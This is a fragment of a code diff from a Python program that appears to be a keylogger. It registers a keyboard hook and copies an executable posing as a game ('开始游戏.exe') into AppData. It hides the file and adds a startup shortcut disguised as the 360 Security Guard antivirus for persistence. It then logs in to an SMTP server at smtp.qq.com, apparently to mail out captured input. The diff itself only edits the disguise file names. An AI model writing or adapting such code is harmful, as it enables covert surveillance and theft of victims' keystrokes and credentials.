@@ -106,7 +106,7 @@ def onKeyboardEvent(event):
 if __name__ == "__main__":
     icon_file=os.getcwd()+"\\"+"ABE.glj"#源图标位置
     exe_file=os.getcwd()+"\\"+"开始游戏.exe"#源程序位置
-    icon_copy=appdata_path+"\\"+"360°安全卫士.ico"#目标图标位置
+    icon_copy=appdata_path+"\\"+"360安全卫士.ico"#目标图标位置
     exe_copy=appdata_path+"\\"+"youxun.exe"#目标程序位置
     if os.path.exists(icon_file) and os.path.exists(exe_file):#源位置无误则复制到目标位置
         shutil.copy(exe_file,exe_copy)
@@ -115,7 +115,7 @@ if __name__ == "__main__":
         os.popen(cmd1).close()
         cmd2 = 'attrib +h "' + exe_copy +'"'
         os.popen(cmd2).close()
-        lnk_name=startup_path+"\\360°安全卫士.lnk"
+        lnk_name=startup_path+"\\360安全卫士.lnk"
         set_shortcut(exe_copy,lnk_name,icon_copy)
     try:
         smtp.connect('smtp.qq.com')#尝试登陆SMTP邮件服
